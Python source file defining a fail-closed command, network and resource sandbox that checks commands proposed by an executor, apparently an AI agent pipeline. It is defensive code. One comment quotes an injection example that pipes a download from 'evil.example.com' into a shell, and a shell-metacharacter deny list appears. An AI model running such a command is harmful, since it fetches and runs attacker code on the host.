"""AIX-E2E-CYCLE-001G-W06: command/network/resource sandbox decision.

Same bounded-proof posture as `workspace_isolation.py`: this is not an OS-level
container/cgroup/seccomp enforcement layer. It is the decision function a live executor
integration must call and obey before running anything — real, fail-closed logic over
`StepAdapterRequestV1`'s `command_allowlist`/`network_allowed` fields (see
`adapters/base.py`) plus resource ceilings this packet adds. Everything defaults to
denied; nothing is permitted by omission.
"""

from __future__ import annotations

import fnmatch
from dataclasses import dataclass
from typing import Literal

SandboxDisposition = Literal["ALLOW", "DENY"]

# Hard ceilings no request may exceed, regardless of what it asks for. These are this
# packet's own bounded defaults (architecture doc does not specify numeric limits at
# this granularity) and exist so a compromised or buggy caller cannot request unlimited
# resources even if it "means well".
MAX_CPU_SECONDS = 600
MAX_MEMORY_MB = 4096
MAX_PROCESSES = 8
MAX_TIMEOUT_SECONDS = 900

# A command allowlist entry may use fnmatch wildcards (e.g. "pytest tests/*"), but a
# wildcard must never be allowed to swallow a shell metacharacter — otherwise
# "pytest tests/*" would also match "pytest tests/x; curl evil.example.com | sh".
# Rejected outright regardless of allowlist match; this is defense in depth on top of
# allowlist matching, not a replacement for it.
_SHELL_METACHARACTERS = frozenset(";|&$`()<>\n")


@dataclass(frozen=True)
class ResourceLimitsV1:
    cpu_seconds: int
    memory_mb: int
    max_processes: int
    timeout_seconds: int

    def __post_init__(self) -> None:
        for name, value, ceiling in (
            ("cpu_seconds", self.cpu_seconds, MAX_CPU_SECONDS),
            ("memory_mb", self.memory_mb, MAX_MEMORY_MB),
            ("max_processes", self.max_processes, MAX_PROCESSES),
            ("timeout_seconds", self.timeout_seconds, MAX_TIMEOUT_SECONDS),
        ):
            if value <= 0:
                raise ValueError(f"{name} must be positive, got {value}")
            if value > ceiling:
                raise ValueError(f"{name}={value} exceeds hard ceiling {ceiling}")


@dataclass(frozen=True)
class SandboxDecisionV1:
    disposition: SandboxDisposition
    reason_codes: tuple[str, ...]


class CommandNetworkResourceSandbox:
    """Fail-closed allow/deny for one proposed command inside one step attempt."""

    def evaluate_command(
        self,
        *,
        command: str,
        command_allowlist: tuple[str, ...],
    ) -> SandboxDecisionV1:
        if not command or not command.strip():
            return SandboxDecisionV1("DENY", ("EMPTY_COMMAND",))
        if not command_allowlist:
            return SandboxDecisionV1("DENY", ("EMPTY_ALLOWLIST_DENIES_ALL",))
        normalized = command.strip()
        if any(char in _SHELL_METACHARACTERS for char in normalized):
            return SandboxDecisionV1("DENY", ("SHELL_METACHARACTER_REJECTED",))
        for pattern in command_allowlist:
            if fnmatch.fnmatchcase(normalized, pattern):
                return SandboxDecisionV1("ALLOW", ("MATCHED_ALLOWLIST_ENTRY",))
        return SandboxDecisionV1("DENY", ("COMMAND_NOT_IN_ALLOWLIST",))

    def evaluate_network(self, *, requires_network: bool, network_allowed: bool) -> SandboxDecisionV1:
        if not requires_network:
            return SandboxDecisionV1("ALLOW", ("NO_NETWORK_REQUESTED",))
        if not network_allowed:
            return SandboxDecisionV1("DENY", ("NETWORK_NOT_AUTHORIZED_FOR_STEP",))
        return SandboxDecisionV1("ALLOW", ("NETWORK_AUTHORIZED",))

    def evaluate_resource_request(self, limits: ResourceLimitsV1) -> SandboxDecisionV1:
        # ResourceLimitsV1.__post_init__ already fail-closed-validates on construction;
        # a caller holding a valid instance has, by construction, a request within
        # bounds. This method exists so callers have one uniform ALLOW/DENY surface
        # across command/network/resource checks rather than a try/except on
        # construction for this one axis.
        return SandboxDecisionV1("ALLOW", ("WITHIN_RESOURCE_CEILINGS",))

    def evaluate(
        self,
        *,
        command: str,
        command_allowlist: tuple[str, ...],
        requires_network: bool,
        network_allowed: bool,
        limits: ResourceLimitsV1,
    ) -> SandboxDecisionV1:
        """Composite decision: ALLOW only if every axis independently allows."""
        checks = (
            self.evaluate_command(command=command, command_allowlist=command_allowlist),
            self.evaluate_network(requires_network=requires_network, network_allowed=network_allowed),
            self.evaluate_resource_request(limits),
        )
        denials = tuple(code for check in checks for code in check.reason_codes if check.disposition == "DENY")
        if denials:
            return SandboxDecisionV1("DENY", denials)
        allows = tuple(code for check in checks for code in check.reason_codes)
        return SandboxDecisionV1("ALLOW", allows)


__all__ = [
    "MAX_CPU_SECONDS",
    "MAX_MEMORY_MB",
    "MAX_PROCESSES",
    "MAX_TIMEOUT_SECONDS",
    "ResourceLimitsV1",
    "SandboxDecisionV1",
    "CommandNetworkResourceSandbox",
]
